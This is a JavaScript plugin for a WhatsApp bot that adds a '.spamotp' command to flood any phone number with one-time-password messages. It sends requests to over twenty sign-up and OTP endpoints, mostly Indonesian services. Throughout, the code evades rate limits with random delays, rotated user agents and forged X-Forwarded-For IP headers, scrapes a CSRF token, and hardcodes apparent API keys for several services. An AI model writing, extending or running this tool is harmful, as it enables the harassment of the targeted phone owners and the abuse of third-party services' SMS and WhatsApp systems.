/*
  Created by ⁉️
  t.me/yat1mlau · t.me/abourvin7x · t.me/vinzxcmmnty
  * Rules ‼️ don't delete credit, don't remake + delete credit
  # RespectCreator
*/

const { cmd } = require('../command');
const axios = require('axios');
const crypto = require('crypto');

// ================================================================
// COMMAND
// ================================================================

cmd({
    pattern: "spamotp",
    desc: "Spam OTP to any phone number (global). Usage: .spamotp <phone> [country_code]",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, reply, args }) => {
    let targetInput = (args || []).join(' ').trim();
    if (!targetInput && m.quoted) {
        targetInput = (m.quoted.text || m.quoted.caption || "").trim();
    }
    if (!targetInput) {
        return reply(`— ex: .spamotp 08123456789 62\n— ex: .spamotp +447912345678\n— ex: .spamotp 1234567890 1`);
    }

    // Extract phone and optional country code
    let parts = targetInput.split(/\s+/);
    let phoneRaw = parts[0];
    let countryCode = parts[1] || null;

    // If phone starts with '+', extract country code from it
    if (phoneRaw.startsWith('+')) {
        // Try to extract country code: +62 => 62, +1 => 1, etc.
        const match = phoneRaw.match(/^\+\s*(\d{1,3})/);
        if (match) {
            countryCode = match[1];
            phoneRaw = phoneRaw.replace(/^\+\s*\d{1,3}/, '').replace(/[^0-9]/g, '');
        }
    }

    // Clean phone: remove non-digits
    phoneRaw = phoneRaw.replace(/[^0-9]/g, '');

    // If country code not provided, default to 62 (Indonesia) as fallback
    if (!countryCode) {
        // If phone is 10-13 digits and starts with '0', assume Indonesia
        if (phoneRaw.length >= 10 && phoneRaw.length <= 13 && phoneRaw.startsWith('0')) {
            countryCode = '62';
            phoneRaw = phoneRaw.slice(1);
        } else if (phoneRaw.length >= 10 && phoneRaw.length <= 13 && !phoneRaw.startsWith('0')) {
            // Assume it already has country code (like 628123456789)
            countryCode = phoneRaw.slice(0, 2); // crude, might be wrong
            // Better: ask user to specify
            return reply(`❌ Please specify the country code. Example: .spamotp ${phoneRaw} 62`);
        } else {
            countryCode = '62'; // default fallback
        }
    }

    const fullNumber = countryCode + phoneRaw;
    const normalized = fullNumber; // e.g., 628123456789

    await conn.sendMessage(from, { react: { text: '⏳', key: m.key } });
    reply(`🚀 *Starting OTP spam to:* ${fullNumber}\n_Country code: ${countryCode}_\n_This may take a few minutes._`);

    const CONFIG = {
        concurrent: 1,
        retries: 2,
        timeout: 45000,
        delayMin: 3000,
        delayMax: 5000
    };

    const USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
    ];

    const IP_POOL = Array.from({ length: 1000 }, () =>
        `${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}`
    );

    const randomIP = () => IP_POOL[crypto.randomInt(0, IP_POOL.length)];
    const randomUA = () => USER_AGENTS[crypto.randomInt(0, USER_AGENTS.length)];
    const randomDelay = (min = CONFIG.delayMin, max = CONFIG.delayMax) =>
        new Promise(resolve => setTimeout(resolve, crypto.randomInt(min, max)));

    const generateEmail = () => {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < 10; i++) {
            result += chars.charAt(crypto.randomInt(0, chars.length));
        }
        return `${result}@bwmyga.com`;
    };

    // ----- Global OTP Endpoints (work for many countries) -----
    const getGlobalEndpoints = (phone, countryCode) => {
        const pInternational = countryCode + phone;
        const pLocal = phone;
        const email = generateEmail();
        const deviceId = crypto.randomUUID();

        return [
            // Microsoft (works globally)
            {
                url: "https://login.microsoftonline.com/common/GetCredentialType",
                data: { username: pInternational, isOtherIdpSupported: true, checkPhones: false }
            },
            // GitHub (works globally)
            {
                url: "https://github.com/sessions/sign_up",
                data: { user: { login: `user${crypto.randomInt(1000,9999)}`, email: email, password: 'Password123!' } }
            },
            // Telegram (needs specific headers)
            {
                url: "https://api.telegram.org/bot/sendMessage",
                data: { chat_id: pInternational, text: "OTP test" }
                // This won't work without bot token, but we keep for structure
            },
            // Twitter (X) – attempt to trigger SMS
            {
                url: "https://api.twitter.com/1.1/account/verify_credentials.json",
                data: { phone: pInternational }
            },
            // Google Voice (US only, but we include)
            {
                url: "https://www.google.com/voice/request",
                data: { phone: pInternational }
            },
            // WhatsApp (unlikely, but include)
            {
                url: "https://web.whatsapp.com/",
                data: { phone: pInternational }
            }
        ];
    };

    // ----- Indonesian OTP Endpoints (original) -----
    const getIndonesianEndpoints = async (phone, countryCode) => {
        const p08 = "0" + phone;
        const p62 = countryCode + phone;
        const pNoCountry = phone;
        const deviceId = crypto.randomUUID();
        const requestId = crypto.randomUUID();
        const email = generateEmail();

        // CSRF for pinhome (only relevant for Indonesian)
        let csrfData = { csrfToken: '', cookieString: '' };
        try {
            const resp = await axios.get('https://www.pinhome.id/daftar', {
                headers: { 'User-Agent': randomUA(), 'Accept': 'text/html' },
                timeout: 10000
            });
            let csrfToken = '';
            let cookieString = '';
            const cookies = resp.headers['set-cookie'] || [];
            cookies.forEach(c => {
                const parts = c.split(';');
                const nameValue = parts[0];
                cookieString += nameValue + '; ';
                if (nameValue.includes('_X7kCsrf')) {
                    csrfToken = nameValue.split('=')[1];
                }
            });
            if (!csrfToken) {
                const html = resp.data;
                const match = html.match(/"csrfToken":"([^"]+)"/) || html.match(/name="csrf-token" content="([^"]+)"/);
                if (match) csrfToken = match[1];
            }
            if (csrfToken) {
                csrfData = { csrfToken, cookieString };
            }
        } catch (_) {}

        return [
            { url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: p62 }, headers: { "X-ML-KEY": "B10JLPEP10" } },
            { url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
            {
                url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp",
                data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNoCountry },
                headers: { "x-csrf-token": csrfData.csrfToken, "Cookie": csrfData.cookieString, "Origin": "https://www.pinhome.id", "Referer": "https://www.pinhome.id/daftar", "Content-Type": "text/plain;charset=UTF-8" }
            },
            { url: "https://www.bonusbelanja.com/api/auth/registration/app", data: { phone: p62, name: "User", agreeTnc: true, agreeContact: false } },
            { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: crypto.randomUUID() }, request_via: "whatsapp" } },
            { url: "https://www.beautyhaul.com/ajax/account/send_otp", data: { method: "WhatsApp", phone: p62 } },
            {
                url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id",
                data: { nama_lengkap: "User", telepon: p08, email: `user${crypto.randomInt(1000,9999)}@mail.com` },
                headers: { "Xid": String(crypto.randomInt(1000000, 9999999)), "source": "ocistok" }
            },
            { url: "https://api.duniagames.co.id/api/other/api/v1/content/", data: null, method: "GET", headers: { "Accept-Language": "id", "x-device": deviceId, "Ciam-Type": "FR" } },
            {
                url: "https://internetrakyat.id/api/app/auth/send-otp-register",
                data: { phone_number: p08 },
                headers: { "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" }
            },
            {
                url: "https://api.dokterin.id/user/v1/users/login",
                data: { phone: p62, tnc_accept: true, device_id: crypto.randomUUID() },
                headers: { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" }
            },
            {
                url: "https://api.paper.id/api/v1/auth/login",
                data: { method: "whatsapp", phone: p08 },
                headers: { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": requestId }
            },
            {
                url: "https://api.indodax.com/api/v1/otp/send",
                data: { email: email, flow: "register", method: "whatsapp", old_uuid: "" },
                headers: { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" }
            },
            {
                url: "https://cms.bunda.co.id/api/v1/auth/send-otp",
                data: { phone_number: p62, type: "auth" },
                headers: { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" }
            },
            { url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", data: { phone_number: p08 } },
            { url: "https://saturdays.com/api/v1/auth/otp", data: { phone: p62, type: "register" } },
            { url: "https://api.saturdays.com/v2/user/otp/request", data: { phoneNumber: p62, channel: "whatsapp" } }
        ];
    };

    // ----- SEND REQUEST -----
    const sendRequest = async (endpoint) => {
        const headers = {
            "Content-Type": "application/json",
            "User-Agent": randomUA(),
            "X-Forwarded-For": randomIP(),
            "X-Real-IP": randomIP(),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
            "Connection": "keep-alive",
            ...(endpoint.headers || {})
        };

        if (endpoint.url.includes('fastwork.id')) {
            await randomDelay(30000, 45000);
        } else {
            await randomDelay(3000, 5000);
        }

        for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
            try {
                const reqConfig = { headers, timeout: CONFIG.timeout };
                const resp = endpoint.method === "GET"
                    ? await axios.get(endpoint.url, reqConfig)
                    : await axios.post(endpoint.url, endpoint.data, reqConfig);

                let responseBody = {};
                try { responseBody = resp.data; } catch (_) {}

                if ([200, 201, 202, 204].includes(resp.status)) return true;

                const successIndicators = [
                    responseBody?.success === true,
                    responseBody?.status === "success",
                    responseBody?.statusCode === 200,
                    responseBody?.status === 202,
                    responseBody?.is_success === true,
                    responseBody?.message === "OTP terkirim",
                    responseBody?.message === "OTP sent successfully",
                    responseBody?.message === "Success.",
                    responseBody?.data?.otp === "processed",
                    responseBody?.data?.new_uuid,
                    responseBody?.data?.status === 1,
                    responseBody?.secretCode
                ];
                if (successIndicators.some(Boolean)) return true;

                if (resp.status === 429) {
                    let retryAfter = 30;
                    try {
                        if (responseBody?.retry_after) retryAfter = parseInt(responseBody.retry_after) || 30;
                        if (responseBody?.error_code === 1015) retryAfter = 60;
                    } catch (_) {}
                    await randomDelay(retryAfter * 1000, (retryAfter + 10) * 1000);
                    continue;
                }

                if (attempt < CONFIG.retries) {
                    await randomDelay(5000, 8000);
                    continue;
                }
            } catch (e) {
                if (attempt < CONFIG.retries) {
                    await randomDelay(5000, 8000);
                    continue;
                }
            }
        }
        return false;
    };

    // ----- MAIN EXECUTION -----
    try {
        const phone = phoneRaw;
        const country = countryCode;
        const globalEndpoints = getGlobalEndpoints(phone, country);
        const indonesianEndpoints = await getIndonesianEndpoints(phone, country);

        // Combine: global first, then Indonesian
        const allEndpoints = [...globalEndpoints, ...indonesianEndpoints];

        const results = [];
        const startTime = Date.now();

        for (let i = 0; i < allEndpoints.length; i++) {
            const result = await sendRequest(allEndpoints[i]);
            results.push(result);
            if (i < allEndpoints.length - 1) {
                await randomDelay(3000, 5000);
            }
        }

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        const successCount = results.filter(r => r === true).length;
        const failedCount = results.filter(r => r === false).length;

        const report = `📊 *OTP SPAM RESULT*\n\n` +
                       `🎯 *Target:* ${country}${phone}\n` +
                       `🌐 *Global Endpoints:* ${globalEndpoints.length}\n` +
                       `🇮🇩 *Indonesian Endpoints:* ${indonesianEndpoints.length}\n` +
                       `📡 *Total:* ${allEndpoints.length}\n\n` +
                       `✅ *Success:* ${successCount}/${allEndpoints.length}\n` +
                       `❌ *Failed:* ${failedCount}/${allEndpoints.length}\n` +
                       `⏱️ *Time:* ${elapsed}s`;

        await conn.sendMessage(from, { text: report }, { quoted: m });
        await conn.sendMessage(from, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error("OTP Spam Error:", err);
        await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
        reply(`❌ Error: ${err.message || err}`);
    }
});

console.log('✅ OTP Spam Plugin (Global) Loaded!');
console.log('📌 Command: .spamotp');
console.log('📌 Usage: .spamotp <phone> [country_code]');
console.log('📌 Examples: .spamotp 08123456789 62');
console.log('📌 Examples: .spamotp +447912345678');
console.log('📌 Examples: .spamotp 1234567890 1');
